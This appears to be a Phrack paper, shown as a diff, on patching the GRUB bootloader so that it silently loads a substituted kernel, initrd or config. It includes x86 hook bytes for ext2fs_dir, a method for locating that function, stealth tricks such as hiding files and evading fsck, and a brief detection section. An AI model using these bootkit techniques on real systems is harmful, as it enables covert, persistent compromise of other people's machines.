@@ -1,0 +1,609 @@
+                           ==Phrack Inc.==
+
+              Volume 0x0b, Issue 0x3f, Phile #0x0a of 0x14
+
+|=-----------------=[ Hacking Grub for fun and profit ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ CoolQ <qufuping@ercist.iscas.ac.cn> ]=---------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Contents
+
+    0.0 - Trojan/backdoor/rootkit review
+
+    1.0 - Boot process with Grub
+        1.1 How does Grub work ?
+        1.2 stage1
+        1.3 stage1.5 & stage2
+        1.4 Grub util
+
+    2.0 - Possibility to load specified file
+
+    3.0 - Hacking techniques
+        3.1 How to load file_fake
+        3.2 How to locate ext2fs_dir
+        3.3 How to hack grub
+        3.4 How to make things sneaky
+
+    4.0 - Usage
+
+    5.0 - Detection
+
+    6.0 - At the end
+
+    7.0 - Ref
+
+    8.0 - hack_grub.tar.gz
+
+--[ 0.0 - Trojan/backdoor/rootkits review
+
+    Since 1989 when the first log-editing tool appeared(Phrack 0x19 #6 -
+Hiding out under Unix), the trojan/backdoor/rootkit have evolved greatly.
+From the early user-mode tools such as LRK4/5, to kernel-mode ones such as
+knark/adore/adore-ng, then appears SuckIT, module-injection, nowadays even
+static kernel-patching.
+    Think carefully, what remains untouched? Yes, that's bootloader. 
+    So, in this paper, I present a way to make Grub follow your order, that
+is, it can load another kernel/initrd image/grub.conf despite the file you
+specify in grub.conf.
+
+P.S.: This paper is based on Linux and EXT2/3 under x86 system.
+
+--[ 1.0 - Boot process with Grub
+
+----[ 1.1 - How does Grub work ?
+
+                       +-----------+
+                       | boot,load |
+                       |    MBR    |
+                       +-----+-----+
+                             |
+                     +----------------+     NO
+                     | Grub is in MBR +------->-------+
+                     +-------+--------+               |
+                        Yes  |  stage1        +-------+--------+
+               Yes  +--------+---------+      | jump to active |
+             +--<---+ stage1.5 config? |      |    partition   |
+             |      +--------+---------+      +-------+--------+
+             |            No |                        |
+     +-------+-------+       |       |          +-----+-----+   
+     | load embedded |       |         stage1-> | load boot | 
+     |   sectors     |       |       |          |   sector  |
+     +-------+-------+       V                  +-----+-----+
+        ^    |               |       + - - - < - - -  + Cf 1.3
+        |    |               |                 +------+------+
+   stage1.5  +-------->------+--------->-------+ load stage2 +
+                                               +------+------+
+                                                      |
+                             +---------------<--------+
+                             V
+                 +-----------+-----------+
+                 |   load the grub.conf  |
+                 | display the boot menu |
+                 +-----------+-----------+
+                             | User interaction
+                   +---------+---------+
+                   | load kernel image |
+                   |     and boot      |
+                   +-------------------+
+
+----[ 1.2 - stage1
+
+    stage1 is 512 Bytes, you can see its source code in stage1/stage1.S .
+It's installed in MBR or in boot sector of primary partition. The task is
+simple - load a specified sector (defined in stage2_sector) to a specified
+address(defined in stage2_address/stage2_segment). If stage1.5 is
+configured, the first sector of stage1.5 is loaded at address 0200:000; if
+not, the first sector of stage2 is loaded at address 0800:0000.
+
+----[ 1.3 - stage1.5 & stage2
+
+    We know Grub is file-system-sensitive loader, i.e. Grub can understand
+and read files from different file-systems, without the help of OS. Then
+how? The secret is stage1.5 & stage2. Take a glance at /boot/grub, you'll
+find the following files:
+stage1, stage2, e2fs_stage1_5, fat_stage1_5, ffs_stage1_5, minix_stage1_5,
+reiserfs_stage1_5, ... 
+    We've mentioned stage1 in 1.2, the file stage1 will be installed in MBR
+or in boot sector. So even if you delete file stage1, system boot are not
+affected.
+    What about zeroing file stage2 and *_stage1_5? Can system still boot?
+The answer is 'no' for the former and 'yes' for the latter. You're
+wondering about the reason? Then continue your reading...
+
+    Let's see how *_stage1_5 and stage2 are generated:
+
+-------------------------------- BEGIN -----------------------------------
+e2fs_stage1_5:
+gcc -o e2fs_stage1_5.exec -nostdlib -Wl,-N -Wl,-Ttext -Wl,2000
+   e2fs_stage1_5_exec-start.o e2fs_stage1_5_exec-asm.o
+   e2fs_stage1_5_exec-common.o e2fs_stage1_5_exec-char_io.o
+   e2fs_stage1_5_exec-disk_io.o e2fs_stage1_5_exec-stage1_5.o
+   e2fs_stage1_5_exec-fsys_ext2fs.o e2fs_stage1_5_exec-bios.o  
+objcopy -O binary e2fs_stage1_5.exec e2fs_stage1_5
+
+stage2:
+gcc -o pre_stage2.exec -nostdlib -Wl,-N -Wl,-Ttext -Wl,8200
+   pre_stage2_exec-asm.o pre_stage2_exec-bios.o pre_stage2_exec-boot.o
+   pre_stage2_exec-builtins.o pre_stage2_exec-common.o
+   pre_stage2_exec-char_io.o pre_stage2_exec-cmdline.o
+   pre_stage2_exec-disk_io.o pre_stage2_exec-gunzip.o
+   pre_stage2_exec-fsys_ext2fs.o pre_stage2_exec-fsys_fat.o
+   pre_stage2_exec-fsys_ffs.o pre_stage2_exec-fsys_minix.o
+   pre_stage2_exec-fsys_reiserfs.o pre_stage2_exec-fsys_vstafs.o
+   pre_stage2_exec-hercules.o pre_stage2_exec-serial.o
+   pre_stage2_exec-smp-imps.o pre_stage2_exec-stage2.o
+   pre_stage2_exec-md5.o
+objcopy -O binary pre_stage2.exec pre_stage2
+cat start pre_stage2 > stage2
+--------------------------------- END ------------------------------------
+
+   According to the output above, the layout should be:
+e2fs_stage1_5:
+  [start.S] [asm.S] [common.c] [char_io.c] [disk_io.c] [stage1_5.c]
+  [fsys_ext2fs.c] [bios.c]
+stage2:
+  [start.S] [asm.S] [bios.c] [boot.c] [builtins.c] [common.c] [char_io.c]
+  [cmdline.c] [disk_io.c] [gunzip.c] [fsys_ext2fs.c] [fsys_fat.c]
+  [fsys_ffs.c] [fsys_minix.c] [fsys_reiserfs.c] [fsys_vstafs.c]
+  [hercules.c] [serial.c] [smp-imps.c] [stage2.c] [md5.c]
+
+    We can see e2fs_stage1_5 and stage2 are similar. But e2fs_stage1_5 is
+smaller, which contains basic modules(disk io, string handling, system
+initialization, ext2/3 file system handling), while stage2 is all-in-one,
+which contains all file system modules, display, encryption, etc.
+
+    start.S is very important for Grub. stage1 will load start.S to
+0200:0000(if stage1_5 is configured) or 0800:0000(if not), then jump to
+it. The task of start.S is simple(only 512Byte),it will load the rest parts
+of stage1_5 or stage2 to memory. The question is, since the file-system
+related code hasn't been loaded, how can grub know the location of the rest
+sectors? start.S makes a trick:
+
+-------------------------------- BEGIN -----------------------------------
+blocklist_default_start:
+	.long 2		/* this is the sector start parameter, in logical
+        		   sectors from the start of the disk, sector 0 */
+blocklist_default_len:	/* this is the number of sectors to read */
+#ifdef STAGE1_5
+	.word 0		/* the command "install" will fill this up */
+#else
+	.word (STAGE2_SIZE + 511) >> 9
+#endif
+blocklist_default_seg:
+#ifdef STAGE1_5
+	.word 0x220
+#else
+	.word 0x820	/* this is the segment of the starting address
+			   to load the data into */
+#endif
+firstlist:	/* this label has to be after the list data!!! */
+--------------------------------- END ------------------------------------
+
+    an example: 
+# hexdump -x -n 512 /boot/grub/stage2
+    ...
+00001d0  [ 0000    0000    0000    0000 ][ 0000    0000    0000    0000 ]
+00001e0  [ 62c7    0026    0064    1600 ][ 62af    0026    0010    1400 ]
+00001f0  [ 6287    0026    0020    1000 ][ 61d0    0026    003f    0820 ]
+
+    We should interpret(backwards) it as: load 0x3f sectors(start with No.
+0x2661d0) to 0x0820:0000, load 0x20 sectors(start with No.0x266287) to
+0x1000:0000, load 0x10 sectors(start with No.0x2662af) to 0x1400:00, load
+0x64 sectors(start with No.0x2662c7) to 0x1600:0000. 
+    In my distro, stage2 has 0xd4(1+0x3f+0x20+0x10+0x64) sectors, file size
+is 108328 bytes, the two matches well(sector size is 512).
+
+    When start.S finishes running, stage1_5/stage2 is fully loaded. start.S
+jumps to asm.S and continues to execute.
+
+    There still remains a problem, when is stage1.5 configured? In fact,
+stage1.5 is not necessary. Its task is to load /boot/grub/stage2 to
+memory. But pay attention, stage1.5 uses file system to load file stage2:
+It analyzes the dentry, gets stage2's inode, then stage2's blocklists. So
+if stage1.5 is configured, the stage2 is loaded via file system; if not,
+stage2 is loaded via both stage2_sector in stage1 and sector lists in
+start.S of stage2.
+    To make things clear, suppose the following scenario: (ext2/ext3)
+       # mv /boot/grub/stage2 /boot/grub/stage2.bak
+    If stage1.5 is configured, the boot fails, stage1.5 can't find
+/boot/grub/stage2 in the file-system. But if stage1.5 is not configured,
+the boot succeeds! That's because mv doesn't change stage2's physical
+layout, so stage2_sector remains the same, also the sector lists in stage2.
+
+    Now, stage1 (-> stage1.5) -> stage2. Everything is in position. asm.S
+will switch to protected mode, open /boot/grub/grub.conf(or menu.lst), get
+configuration, display menus, and wait for user's interaction. After user
+chooses the kernel, grub loads the specified kernel image(sometimes
+ramdisk image also), then boots the kernel.
+
+----[ 1.4 - Grub util
+
+    If your grub is overwritten by Windows, you can use grub util to
+reinstall grub.
+
+    # grub
+    ---
+    grub > find /grub/stage2      <- if you have boot partition
+    or
+    grub > find /boot/grub/stage2 <- if you don't have boot partition
+    ---
+    (hd0,0)                       <= the result of 'find'
+    grub > root (hd0,0)           <- set root of boot partition
+    ---
+    grub > setup (hd0)            <- if you want to install grub in mbr
+    or
+    grub > setup (hd0,0)          <- if you want to install grub in the
+    ---                              boot sector
+    Checking if "/boot/grub/stage1" exists... yes
+    Checking if "/boot/grub/stage2" exists... yes
+    Checking if "/boot/grub/e2fs_stage1_t" exists... yes
+    Running "embed /boot/grub/e2fs_stage1_5 (hd0)"... 22 sectors are
+embedded succeeded.                <= if you install grub in boot sector,
+                                     this fails
+    Running "install /boot/grub/stage1 d (hd0) (hd0)1+22 p
+(hd0,0)/boot/grub/stage2 /boot/grub/grub.conf"... succeeded
+    Done
+
+    We can see grub util tries to embed stage1.5 if possible. If grub is
+installed in MBR, stage1.5 is located after MBR, 22 sectors in size. If
+grub is installed in boot sector, there's not enough space to embed
+stage1.5(superblock is at offset 0x400 for ext2/ext3 partition, only 0x200
+for stage1.5), so the 'embed' command fails.
+    Refer to grub manual and source codes for more info.
+
+--[ 2.0 - Possibility to load specified file
+
+    Grub has its own mini-file-system for ext2/3. It use grub_open(),
+grub_read() and grub_close() to open/read/close a file. Now, take a look at
+ext2fs_dir
+
+/* preconditions: ext2fs_mount already executed, therefore supblk in buffer
+ *                known as SUPERBLOCK 
+ * returns: 0 if error, nonzero iff we were able to find the file
+ *          successfully
+ * postconditions: on a nonzero return, buffer known as INODE contains the
+ *                 inode of the file we were trying to look up
+ * side effects: messes up GROUP_DESC buffer area
+ */
+int ext2fs_dir (char *dirname) {
+  int current_ino = EXT2_ROOT_INO;	/*start at the root */
+  int updir_ino = current_ino;	/* the parent of the current directory */
+  ...
+}
+
+    Suppose the line in grub.conf is:
+    kernel=/boot/vmlinuz-2.6.11 ro root=/dev/hda1
+    grub_open calls ext2fs_dir("/boot/vmlinuz-2.6.11 ro root=/dev/hda1"),
+ext2fs_dir puts the inode info in INODE, then grub_read can use INODE to
+get data of any offset(the map resides in INODE->i_blocks[] for direct
+blocks).
+
+    The internal of ext2fs_dir is:
+    1. /boot/vmlinuz-2.6.11 ro root=/dev/hda1
+       ^ inode = EXT2_ROOT_INO, put inode info in INODE;
+    2. /boot/vmlinuz-2.6.11 ro root=/dev/hda1
+        ^ find dentry in '/', then put the inode info of '/boot' in INODE;
+    3. /boot/vmlinuz-2.6.11 ro root=/dev/hda1
+             ^ find dentry in '/boot', then put the inode info of
+             '/boot/vmlinuz-2.6.11' in INODE;
+    4. /boot/vmlinuz-2.6.11 ro root=/dev/hda1
+                           ^ the pointer is space, INODE is regular file,
+                           returns 1(success), INODE contains info about
+                           '/boot/vmlinuz-2.6.11'.
+    If we parasitize this code, and return inode info of file_fake, grub
+will happily load file_fake, considering it as /boot/vmlinuz-2.6.11.
+    We can do this:
+    1. /boot/vmlinuz-2.6.11 ro root=/dev/hda1
+       ^ inode = EXT2_ROOT_INO;
+    2.  boot/vmlinuz-2.6.11 ro root=/dev/hda1
+       ^ change it to 0x0, change EXT2_ROOT_INO to inode of file_fake;
+    3.  boot/vmlinuz-2.6.11 ro root=/dev/hda1
+       ^ EXT2_ROOT_INO(file_fake) info is in INODE, the pointer is 0x0,
+       INODE is regular file, returns 1.
+
+    Since we change the argument of ext2fs_dir, does it have side-effects?
+Don't forget the latter part "ro root=/dev/hda1", it's the parameter passed
+to kernel. Without it, the kernel won't boot correctly. 
+(P.S.: Just "cat/proc/cmdline" to see the parameter your kernel has.)
+    So, let's check the internal of "kernel=..."
+    kernel_func processes the "kernel=..." line
+
+static int
+kernel_func (char *arg, int flags)
+{
+  ...
+  /* Copy the command-line to MB_CMDLINE.  */
+  grub_memmove (mb_cmdline, arg, len + 1);
+  kernel_type = load_image (arg, mb_cmdline, suggested_type, load_flags);
+  ...
+}
+
+    See? The arg and mb_cmdline have 2 copies of string
+"/boot/vmlinuz-2.6.11 ro root=/dev/hda1" (there is no overlap, so in fact,
+grub_memmove is the same as grub_memcpy). In load_image, you can find arg
+and mb_cmdline don't mix with each other. So, the conclusion is - NO
+side-effects. If you're not confident, you can add some codes to get things
+back.
+
+--[ 3.0 - Hacking techniques
+
+    The hacking techniques should be general for all grub versions(exclude
+grub-ng) shipped with all Linux distros.
+
+----[ 3.1 - How to load file_fake
+
+    We can add a jump at the beginning of ext2fs_dir, then make the first
+character of ext2fs_dir's argument to 0, make "current_ino = EXT2_ROOT_INO"
+to "current_ino = INODE_OF_FAKE_FILE", then jump back. 
+    Attention: Only when certain condition is met can you load file_fake. 
+e.g.: When system wants to open /boot/vmlinuz-2.6.11, then /boot/file_fake
+is returned; while when system wants /boot/grub/grub.conf, the correct file
+should be returned. If the codes still return /boot/file_fake, oops, no
+menu display.
+    Jump is easy, but how to make "current_ino = INODE_OF_FAKE_FILE"?
+int ext2fs_dir (char *dirname) {
+  int current_ino = EXT2_ROOT_INO;	/*start at the root */
+  int updir_ino = current_ino;	/* the parent of the current directory */
+ ...
+    EXT2_ROOT_INO is 2, so current_ino and updir_ino are initialized to 2.
+The correspondent assembly code should be like "movl $2, 0xffffXXXX($esp)"
+But keep in mind of optimization: both current_ino and updir_ino are
+assigned to 2, the optimized result can be "movl $2, 0xffffXXXX($esp)"
+and "movl $2, 0xffffYYYY($esp)", or "movl $2, %reg" then "movl %reg,
+0xffffXXXX($esp)" "movl %reg, 0xffffYYYY($esp)", or more variants. The type
+is int, value is 2, so the possibility of "xor %eax, %eax; inc %eax; 
+inc %eax" is low, it's also the same to "xor %eax, %eax; movb $0x2, %al". 
+What we need is to search 0x00000002 from ext2fs_dir to ext2fs_dir + 
+depth(e.g.: 100 bytes), then change 0x00000002 to INODE_OF_FAKE_FILE.
+
+static char ext2_embed_code[] = {
+
+	0x60,				/* pusha			*/
+	0x9c,				/* pushf			*/
+	0xeb, 0x28,			/* jmp 4f			*/
+	0x5f,				/* 1: pop %edi			*/
+	0x8b, 0xf,			/* movl (%edi), %ecx		*/
+	0x8b, 0x74, 0x24, 0x28,		/* movl 40(%esp), %esi		*/
+	0x83, 0xc7, 0x4,		/* addl $4, %edi		*/
+	0xf3, 0xa6,		/* repz cmpsb %es:(%edi), %ds:(%esi)	*/
+	0x83, 0xf9, 0x0,		/* cmp $0, %ecx			*/
+	0x74, 0x2,			/* je 2f			*/
+	0xeb, 0xe, 			/* jmp 3f			*/
+	0x8b, 0x74, 0x24, 0x28,		/* 2: movl 40(%esp), %esi	*/
+	0xc6, 0x6, 0x00,		/* movb $0x0, (%esi)  	'\0' 	*/
+	0x9d,				/* popf				*/
+	0x61,				/* popa				*/
+	0xe9, 0x0, 0x0, 0x0, 0x0,	/* jmp change_inode		*/
+	0x9d,				/* 3: popf			*/
+	0x61,				/* popa				*/
+	0xe9, 0x0, 0x0, 0x0, 0x0,	/* jmp not_change_inode		*/
+	0xe8, 0xd3, 0xff, 0xff, 0xff,	/* 4: call 1b			*/
+	
+	0x0, 0x0, 0x0, 0x0,		/* kernel filename length	*/
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,	/* filename string, 48B in all	*/
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0,
+	0x0, 0x0, 0x0, 0x0, 0x0, 0x0
+};
+
+memcpy(	buf_embed, ext2_embed_code, sizeof(ext2_embed_code));
+Of course you can write your own string-comparison algorithm.
+
+/* embeded code, 2nd part, change_inode */
+memcpy(	buf_embed + sizeof(ext2_embed_code), s_start, s_mov_end - s_start);
+modify_EXT2_ROOT_INO_to_INODE_OF_FAKE_FILE();
+
+/* embeded code, 3rd part, not_change_inode*/
+memcpy(	buf_embed + sizeof(ext2_embed_code) + (s_mov_end - s_start) + 5,
+	s_start, s_mov_end - s_start);
+
+  The result is like this:
+
+ ext2fs_dir:                                   not_change_inode:
+  +------------------------+        +--------> +------------------------+
+  | push %esp <= jmp embed |        |          | push %esp              |
+  | mov %esp, %ebp         |        |          | mov %esp, %ebp         |
+  | push %edi              |        |          | push %edi              |
+  | push %esi              +--------<          | push %esi              |
+  | sub $0x42c, %esp       |        |          | sub $0x42c, %esp       |
+  | mov $2, fffffbe4(%esp) |        |          | mov $2, fffffbe4(%esp) |
+  | mov $2, fffffbe0(%esp) |        |          | mov $2, fffffbe0(%esp) |
+  |back:                   |        |          | jmp back               |
+  +------------------------+        |          +------------------------+
+ embed:                             +--------> change_inode:
+  +------------------------+                   +------------------------+
+  | save registers         |                   | push %esp              |
+  | compare strings        |                   | mov %esp, %ebp         | 
+  | if match, goto 1       |                   | push %edi              |
+  | if not, goto 2         |                   | push %esi              |
+  | 1: restore registers   |                   | sub $0x42c, %esp       |
+  | jmp change_inode       |   INODE_OF_   ->  | mov $?, fffffbe4(%esp) |
+  | 2: restore registers   |   FAKE_FILE   ->  | mov $?, fffffbe0(%esp) |
+  | jmp not_change_inode   |                   | jmp back               |
+  +------------------------+                   +------------------------+
+
+----[ 3.2 - How to locate ext2fs_dir
+
+    That's the difficult part. stage2 is generated by objcopy, so all ELF
+information are stripped - NO SYMBOL TABLE! We must find some PATTERNs to
+locate ext2fs_dir.
+
+    The first choice is log2:
+    #define long2(n) ffz(~(n))
+    static __inline__ unsigned long
+    ffz (unsigned long word)
+    {
+        __asm__ ("bsfl %1, %0"
+                :"=r" (word)
+                :"r" (~word));
+        return word;
+    }
+    group_desc = group_id >> log2 (EXT2_DESC_PER_BLOCK (SUPERBLOCK));
+
+    The question is, ffz is declared as __inline__, which indicates MAYBE
+this function is inlined, MAYBE not. So we give it up.
+
+    Next choice is SUPERBLOCK->s_inodes_per_group in
+    group_id = (current_ino - 1) / (SUPERBLOCK->s_inodes_per_group);
+    #define RAW_ADDR(x) (x)
+    #define FSYS_BUF RAW_ADDR(0x68000)
+    #define SUPERBLOCK ((struct ext2_super_block *)(FSYS_BUF))
+    struct ext2_super_block{
+        ...
+        __u32 s_inodes_per_group	/* # Inodes per group */
+        ...
+    }
+
+    Then we calculate SUPERBLOCK->s_inodes_per_group is at 0x68028. This
+address only appears in ext2fs_dir, so the possibility of collision is low.
+After locating 0x68028, we move backwards to get the start of ext2fs_dir.
+Here comes another question, how to identify the start of ext2fs_dir? Of
+course you can search backwards for 0xc3, likely it's ret. But what if it's
+only part of an instruction such as operands? Also, sometimes, gcc adds
+some junk codes to make function address aligned(4byte/8byte/16byte), then
+how to skip these junk codes? Just list all the possible combinations?
+    This method is practical, but not ideal.
+
+    Now, we noticed fsys_table:
+
+    struct fsys_entry fsys_table[NUM_FSYS + 1] =
+    {
+      ...
+    # ifdef FSYS_FAT
+      {"fat", fat_mount, fat_read, fat_dir, 0, 0},
+    # endif
+    # ifdef FSYS_EXT2FS
+      {"ext2fs", ext2fs_mount, ext2fs_read, ext2fs_dir, 0, 0},
+    # endif
+    # ifdef FSYS_MINIX
+      {"minix", minix_mount, minix_read, minix_dir, 0, 0},
+    # endif
+      ...
+    };
+
+    fsys_table is called like this:
+
+      if ((*(fsys_table[fsys_type].mount_func)) () != 1)
+
+    So, our trick is: 
+1. Search stage2 for string "ext2fs", get its offset, then convert it to
+   memory address(stage2 starts from 0800:0000) addr_1.
+2. Search stage2 for addr_1, get its offset, then get next 5 integers
+   (A, B, C, D, E), A<B ? B<C ? C<addr_1 ? D==0 ? E==0? If any one is "No",
+   goto 1 and continue search
+3. Then C is memory address of ext2fs_dir, convert it to file offset. OK,
+   that's it.
+
+----[ 3.3 - How to hack grub
+
+    OK, with the help of 3.1 and 3.2, we can hack grub very easily.
+    The first target is stage2. We get the start address of ext2fs_dir, add
+a JMP to somewhere, then copy the embeded code. Then where is 'somewhere'?
+Obviously, the tail of stage2 is not perfect, this will change the file
+size. We can choose minix_dir as our target. What about fat_mount? It's
+right behind ext2fs_dir. But the answer is NO! Take a look at "root ..."
+
+    root_func()->open_device()->attemp_mount()
+    for (fsys_type = 0; fsys_type < NUM_FSYS
+         && (*(fsys_table[fsys_type].mount_func)) () != 1; fsys_type++);
+
+    Take a look at fsys_table, fat is ahead of ext2, so fat_mount is called
+first. If fat_mount is modified, god knows the result. To make things safe,
+we choose minix_dir.
+
+    Now, your stage2 can load file_fake. Size remains the same, but hash
+value changed.
+
+----[ 3.4 - How to make things sneaky
+
+    Why must we use /boot/grub/stage2? We can get stage1 jump to
+stage2_fake(cp stage2 stage2_fake, modify stage2_fake), so stage2 remains
+intact. 
+    If you cp stage2 to stage2_fake, stage2_fake won't work. Remember the
+sector lists in start.S? You have to change the lists to stage2_fake, not
+the original stage2. You can retrieve the inode, get i_block[], then the
+block lists are there(Don't forget to add the partition offset). You have
+to bypass the VFS to get inode info, see [1].
+    Since you use stage2_fake, the correspondent address in stage1 should
+be modified. If the stage1.5 is not installed, that's easy, you just change
+stage2_sector from stage2_orig to stage2_fake(MBR is changed). If stage1.5
+is installed and you're lazy and bold, you can skip stage1.5 - modify
+stage2_address, stage2_sector, stage2_segment of stage1. This is risky, 
+because 1) If "virus detection" in BIOS is enabled, the MBR modification 
+will be detected 2) The "Grub stage1.5" & "Grub loading, please wait" will
+change to "Grub stage2". It's flashy, can you notice it on your FAST PC? 
+    If you really want to be sneaky, then you can hack stage1.5, using
+similiar techniques like 3.1 and 3.2. Don't forget to change the sector
+lists of stage1.5(start.S) - you have to append your embeded code at the
+end.
+    You can make things more sneaky: make stage2_fake/kernel_fake hidden
+from FS, e.g. erase its dentry from /boot/grub. Wanna anti-fsck? Move
+inode_of_stage2 to inode_from_1_to_10. See  [2]
+
+--[ 4.0 - Usage
+
+    Combined with other techniques, see how powerful our hack_grub is.
+    Notes: All files should reside in the same partition!
+    1) Combined with static kernel patch
+       a) cp kernel.orig kernel.fake
+       b) static kernel patch with kernel.fake[3]
+       c) cp stage2 stage2.fake
+       d) hack_grub stage2.fake kernel.orig inode_of_kernel.fake
+       e) hide kernel.fake and stage2.fake (optional)
+    2) Combined with module injection
+       a) cp initrd.img.orig initrd.img.fake
+       b) do module injection with initrd.img.fake, e.g. ext3.[k]o [4]
+       c) cp stage2 stage2.fake
+       d) hack_grub stage2.fake initrd.img inode_of_initrd.img.fake
+       e) hide initrd.img.fake and stage2.fake (optional)
+    3) Make a fake grub.conf
+    4) More...
+
+--[ 5.0 - Detection
+
+    1) Keep an eye on MBR and the following 63 sectors, also primary boot
+       sectors.
+    2) If not 1, 
+        a) if stage1.5 is configured, compare sectors from 3(absolute
+           address, MBR is sector No. 1) with /boot/grub/e2fs_stage1_5
+        b) if stage1.5 is not configured, see if stage2_sector points to
+           real /boot/grub/stage2 file
+    3) check the file consistency of e2fs_stage1_5 and stage2
+    4) if not 3 (Hey, are you a qualified sysadmin?)
+       if a) If you're suspicious about kernel, dump the kernel and make a
+             byte-to-byte with kernel on disk. See [5] for more
+          b) If you're suspicious about module, that's a hard challenge,
+             maybe you can dump it and disassemble it?
+
+--[ 6.0 - At the end
+
+    Lilo is another boot loader, but it's file-system-insensitive. So Lilo
+doesn't have built-in file-systems. It relies on /boot/bootsect.b and
+/boot/map.b. So, if you're lazy, write a fake lilo.conf, which displays
+a.img but loads b.img. Or, you can make lilo load /boot/map.b.fake. The
+details depend on yourself. Do it!
+
+    Thanks to madsys & grip2 for help me solve some hard-to-crack things;
+thanks to airsupply and other guys for stage2 samples (redhat 7.2/9/as3,
+Fedora Core 2, gentoo, debian and ubuntu), thanks to zhtq for some comments
+about paper-writing.
+
+--[ 7.0 - Ref
+
+[1] Design and Implementation of the Second Extended Filesystem
+    http://e2fsprogs.sourceforge.net/ext2intro.html
+[2] ways to hide files in ext2/3 filesystem (Chinese)
+    http://www.linuxforum.net/forum/gshowflat.php?Cat=&Board=security&
+    Number=545342&page=0&view=collapsed&sb=5&o=all&vc=1 
+[3] Static Kernel Patching
+    http://www.phrack.org/show.php?p=60&a=8
+[4] Infecting Loadable Kernel Modules
+    http://www.phrack.org/show.php?p=61&a=10
+[5] Ways to find 2.6 kernel rootkits (Chinese)
+    http://www.linuxforum.net/forum/gshowflat.php?Cat=&Board=security&
+    Number=540646&page=0&view=collapsed&sb=5&o=all&vc=1
